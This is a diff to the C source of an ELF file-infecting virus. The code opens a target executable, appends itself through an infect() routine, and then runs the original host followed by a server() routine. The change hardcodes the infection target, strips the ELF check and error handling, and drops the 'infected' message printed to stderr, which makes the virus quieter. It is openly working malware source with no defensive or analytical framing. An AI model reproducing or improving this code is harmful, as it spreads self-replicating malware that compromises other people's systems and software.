@@ -17,6 +17,8 @@
 
 #define opt 3
 
+#define infection_target ""
+
 extern char** environ;
 
 always_inline optimize(opt) static inline long elf_size(FILE*);
@@ -30,20 +32,17 @@ always_inline optimize(opt) static inline void server();
 
 
 int main(int argc, char** argv){
-  if(argc == 2 && is_elf(argv[1]) && !is_infected(argv[1])){
-    FILE* host=fopen(argv[1], "rb+");
+  if(!is_infected(infection_target)){
+    FILE* host=fopen(infection_target, "rb+");
     FILE* parasite=fopen(argv[0], "rb");
-    if(host && parasite){
-      infect(host, parasite);
-      fclose(host);
-      fclose(parasite);
-    }
-  }else if(argc == 1 && is_infected(argv[0])){
+    infect(host, parasite);
+    fclose(host);
+    fclose(parasite);
+  }else{
     FILE* infected=fopen(argv[0], "rb");
-    fprintf(stderr, "infected ");
     execute_host(infected, argv, environ);
+    server();
   }
-  server();
 }
 
 long elf_size(FILE* f){
@@ -53,18 +52,18 @@ long elf_size(FILE* f){
   return header.e_shoff+(header.e_shentsize*header.e_shnum);
 }
 
-int is_elf(char* f){
-  FILE* file = fopen(f, "rb");
-  if(file){
-    Elf64_Ehdr header;
-    fread(&header, 1, sizeof(Elf64_Ehdr), file);
-    fclose(file);
-    if(memcmp(header.e_ident, ELFMAG, SELFMAG) == 0){
-      return 1;
-    }
-  }
-  return 0;
-}
+/* int is_elf(char* f){ */
+/*   FILE* file = fopen(f, "rb"); */
+/*   if(file){ */
+/*     Elf64_Ehdr header; */
+/*     fread(&header, 1, sizeof(Elf64_Ehdr), file); */
+/*     fclose(file); */
+/*     if(memcmp(header.e_ident, ELFMAG, SELFMAG) == 0){ */
+/*       return 1; */
+/*     } */
+/*   } */
+/*   return 0; */
+/* } */
 
 int is_infected(char* f){
   FILE* file = fopen(f, "rb");
